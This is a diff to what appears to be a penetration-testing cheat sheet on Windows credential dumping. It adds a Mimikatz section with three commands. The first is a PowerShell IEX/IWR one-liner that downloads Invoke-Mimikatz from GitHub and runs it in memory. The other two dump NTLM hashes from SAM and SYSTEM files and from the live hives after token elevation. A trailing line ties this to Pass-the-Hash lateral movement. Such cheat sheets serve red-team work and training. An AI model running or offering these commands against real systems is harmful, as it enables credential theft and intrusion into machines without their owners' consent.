@@ -50,4 +50,19 @@
 
     Invoke-HiveDump
 
+#### 9) Mimikatz
+
+##### Load into memory
+
+    IEX (IWR -UseBasicParsing "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1")
+
+##### Dump from SAM and SYSTEM. Ensure files are in the current working directory
+
+    Invoke-Mimikatz -command "lsadump::sam /system:SYSTEM /sam:SAM"
+
+##### Dump against the live hive files
+
+    Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
+
+
 ### With dumping the SAM hive, we dump NTLM hashes to perform Pass-the-Hash attacks (Lateral Movement)
